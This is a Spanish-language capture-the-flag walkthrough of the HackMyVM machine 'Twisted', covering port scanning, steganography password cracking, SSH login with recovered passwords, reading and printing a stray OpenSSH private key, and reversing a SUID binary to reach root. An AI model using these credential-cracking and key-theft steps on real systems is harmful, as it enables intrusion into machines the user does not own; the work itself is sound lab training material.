---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Twisted HackMyVM (Easy- Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-28 03:11 EDT
Nmap scan report for 192.168.1.171
Host is up (0.00041s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 67:63:a0:c9:8b:7a:f3:42:ac:49:ab:a6:a7:3f:fc:ee (RSA)
|   256 8c:ce:87:47:f8:b8:1a:1a:78:e5:b7:ce:74:d7:f5:db (ECDSA)
|_  256 92:94:66:0b:92:d3:cf:7e:ff:e8:bf:3c:7b:41:b7:5a (ED25519)
MAC Address: 08:00:27:A6:15:92 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.57 seconds
```

Veremos varias cosas interesantes, pero vamos a ver que contiene el puerto `80`, a ver que pagina web hay y que podemos ver.

Si entramos no veremos gran cosa, unas imagenes y poco mas, pero nos comenta la pagina que la primera imagen es diferente a la segunda, por lo que podemos deducir que algo a nivel interno puede ser a lo que se este refiriendo, por lo que vamos a ver si podemos extraer algunos archivos de las imagenes.

Nos descargaremos las imagenes de la siguiente forma:

```shell
curl -O http://<IP>/cat-hidden.jpg
curl -O http://<IP>/cat-original.jpg
```

Una vez echo esto, vamos a probar a intentar extraer datos de la propia imagen sin ningun tipo de contraseña de la siguiente forma:

## steghide/stegcracker

```shell
steghide extract -sf cat-hidden.jpg
```

Si dejamos el campo de la contraseña vacia veremos que no nos extrae nada, por lo que vamos a intentar a `crackear` dicha contraseña con una version de esta herramienta pero preparada para probar fuerza bruta llamada `stegcracker`:

```shell
stegcracker cat-hidden.jpg <WORDLIST>
```

Info:

```
StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2025 - Luke Paris (Paradoxis)

StegCracker has been retired following the release of StegSeek, which 
will blast through the rockyou.txt wordlist within 1.9 second as opposed 
to StegCracker which takes ~5 hours.

StegSeek can be found at: https://github.com/RickdeJager/stegseek

Counting lines in wordlist..
Attacking file 'cat-hidden.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
Successfully cracked file with password: sexymama
Tried 964 passwords
Your file has been written to: cat-hidden.jpg.out
sexymama
```

Veremos que la contraseña es `sexymama` de la imagen `cat-hidden`, vamos a probar con la otra tambien:

```shell
stegcracker cat-original.jpg <WORDLIST>
```

Info:

```
StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2025 - Luke Paris (Paradoxis)

StegCracker has been retired following the release of StegSeek, which 
will blast through the rockyou.txt wordlist within 1.9 second as opposed 
to StegCracker which takes ~5 hours.

StegSeek can be found at: https://github.com/RickdeJager/stegseek

Counting lines in wordlist..
Attacking file 'cat-original.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
Successfully cracked file with password: westlife
Tried 712 passwords
Your file has been written to: cat-original.jpg.out
westlife
```

Veremos que tambien nos saca la contraseña y para esta sera `westlife` por lo que vamos a extraer los archivos de cada imagen con dichas contraseñas de la siguiente forma:

```shell
steghide extract -sf cat-hidden.jpg
```

Metemos como contraseña `sexymama` y veremos que nos extrajo un archivo llamado `mateo.txt`.

```shell
steghide extract -sf cat-original.jpg
```

Metemos como contraseña `westlife` y veremos que nos extrajo un archivo llamado `markus.txt`.

Vamos a ver que contienen dichos archivos:

> mateo.txt

```
thisismypassword
```

> markus.txt

```
markuslovesbonita
```

Pueden ser las contraseñas de dichos usuarios como nombre de archivo, vamos a probar a meternos como `markus` a ver si nos deja por el servidor `SSH`.

## Escalate user markus

### SSH

```shell
ssh markus@<IP> -p 2222
```

Metemos como contraseña `markuslovesbonita` y veremos que estamos dentro.

## Escalate user bonita

Si listamos la `home` de `markus` veremos una `note.txt` que pone lo siguiente:

```
Hi bonita,
I have saved your id_rsa here: /var/cache/apt/id_rsa
Nobody can find it.
```

Si listamos el `passwd`:

```shell
cat /etc/passwd | grep "/bin/bash"
```

Info:

```
root:x:0:0:root:/root:/bin/bash
mateo:x:1000:1000:mateo,,,:/home/mateo:/bin/bash
markus:x:1001:1001:,,,:/home/markus:/bin/bash
bonita:x:1002:1002:,,,:/home/bonita:/bin/bash
```

Veremos que hay un usuario llamado `bonita` por lo que esa `id_rsa` que esta comentando puede ser de dicho usuario.

Si probamos a intentar leer la `id_rsa` con `cat` veremos que no nos deja, pero si lo hacemos con `tail`, si nos dejara:

```shell
tail -100 /var/cache/apt/id_rsa
```

Info:

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEA8NIseqX1B1YSHTz1A4rFWhjIJffs5vSbAG0Vg2iTa+xshyrmk6zd
FyguFUO7tN2TCJGTomDTXrG/KvWaucGvIAXpgV1lQsQkBV/VNrVC1Ioj/Fx3hUaSCC4PBS
olvmldJg2habNOUGA4EBKlTwfDi+vjDP8d77mF+rvA3EwR3vj37AiXFk5hBEsqr9cWeTr1
vD5282SncYtJb/Zx0eOa6VVFqDfOB7LKZA2QYIbfR7jezOdX+/nlDKX8Xp07wimFuMJpcF
gFnch7ptoxAqe0M0UIEzP+G2ull3m80G5L7Q/3acg14ULnNVs5dTJWPO2Fp7J2qKW+4A5C
tt0G5sIBpQAAA8hHx4cBR8eHAQAAAAdzc2gtcnNhAAABAQDw0ix6pfUHVhIdPPUDisVaGM
gl9+zm9JsAbRWDaJNr7GyHKuaTrN0XKC4VQ7u03ZMIkZOiYNNesb8q9Zq5wa8gBemBXWVC
xCQFX9U2tULUiiP8XHeFRpIILg8FKiW+aV0mDaFps05QYDgQEqVPB8OL6+MM/x3vuYX6u8
DcTBHe+PfsCJcWTmEESyqv1xZ5OvW8PnbzZKdxi0lv9nHR45rpVUWoN84HsspkDZBght9H
uN7M51f7+eUMpfxenTvCKYW4wmlwWAWdyHum2jECp7QzRQgTM/4ba6WXebzQbkvtD/dpyD
XhQuc1Wzl1MlY87YWnsnaopb7gDkK23QbmwgGlAAAAAwEAAQAAAQAuUW5GpLbNE2vmfbvu
U3mDy7JrQxUokrFhUpnJrYp1PoLdOI4ipyPa+VprspxevCM0ibNojtD4rJ1FKPn6cls5gI
mZ3RnFzq3S7sy2egSBlpQ3TJ2cX6dktV8kMigSSHenAwYhq2ALq4X86WksGyUsO1FvRX4/
hmJTiFsew+7IAKE+oQHMzpjMGyoiPXfdaI3sa10L2WfkKs4I4K/v/x2pW78HIktaQPutro
nxD8/fwGxQnseC69E6vdh/5tS8+lDEfYDz4oEy9AP26Hdtho0D6E9VT9T//2vynHLbmSXK
mPbr04h5i9C3h81rh4sAHs9nVAEe3dmZtmZxoZPOJKRhAAAAgFD+g8BhMCovIBrPZlHCu+
bUlbizp9qfXEc8BYZD3frLbVfwuL6dafDVnj7EqpabmrTLFunQG+9/PI6bN+iwloDlugtq
yzvf924Kkhdk+N366FLDt06p2tkcmRljm9kKMS3lBPMu9C4+fgo9LCyphiXrm7UbJHDVSP
UvPg4Fg/nqAAAAgQD9Q83ZcqDIx5c51fdYsMUCByLby7OiIfXukMoYPWCE2yRqa53PgXjh
V2URHPPhqFEa+iB138cSgCU3RxbRK7Qm1S7/P44fnWCaNu920iLed5z2fzvbTytE/h9QpJ
LlecEv2Hx03xyRZBsHFkMf+dMDC0ueU692Gl7YxRw+Lic0PQAAAIEA82v3Ytb97SghV7rz
a0S5t7v8pSSYZAW0OJ3DJqaLtEvxhhomduhF71T0iw0wy8rSH7j2M5PGCtCZUa2/OqQgKF
eERnqQPQSgM0PrATtihXYCTGbWo69NUMcALah0gT5i6nvR1Jr4220InGZEUWHLfvkGTitu
D0POe+rjV4B7EYkAAAAOYm9uaXRhQHR3aXN0ZWQBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

Vamos a probar a meternos con el usuario `bonita` mediante esta `id_rsa`:

```shell
nano id_rsa

#Dentro del nano
<ID_RSA_BONITA>
```

Lo guardamos y establecemos los permisos necesarios para que nos podamos conectar:

```shell
chmod 600 id_rsa
```

Ahora si nos conectamos:

```shell
ssh -i id_rsa bonita@<IP> -p 2222
```

Info:

```
Linux twisted 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
bonita@twisted:~$ whoami
bonita
```

Veremos que estaremos dentro con dicho usuario, por lo que leeremos la `flag` del usuario.

> user.txt

```
HMVblackcat
```

## Escalate Privileges

Si listamos la `home` de dicho usuario, veremos un binario con permisos `SUID`:

```
-rwsrws--- 1 root   bonita 16864 Oct 14  2020 beroot
```

Vamos a ver que contiene por dentro con la herramienta de `ghidra`, primero nos pasaremos el binario con un servidor de `python3` de la siguiente forma:

```shell
python3 -m http.server
```

Ahora desde nuestro `host` haremos lo siguiente:

```shell
wget http://<IP>:8000/beroot
```

Una vez descargado abriremos `ghidra` y crearemos un proyecto nuevo, importamos el binario y lo analizamos, con esto ya podremos ver el codigo decompilado de dicho binario.

Veremos con el codigo `decompilado` en el `main` esta parte de aqui:

<figure><img src="../../.gitbook/assets/image (362).png" alt=""><figcaption></figcaption></figure>

Vamos a ver como se veria en `decimal` ese `hexadecimal` en el cual esta haciendo la comparacion, ya que vemos que si obtenemos el codigo con el que se esta comparando vamos a poder tener una `shell` como el usuario `root`:

```shell
printf "%d\n" 0x16f8
```

Info:

```
5880
```

Vemos que el codigo en `decimal` es `5880` por lo que vamos a probar a meterlo a ver si es el correcto:

```shell
./beroot
```

Metemos como contraseña `5880`.

Info:

```
root@twisted:~# whoami
root
```

Veremos que ha funcionado, por lo que ya seremos `root` y leeremos la `flag` de `root`:

> root.txt

```
HMVwhereismycat
```
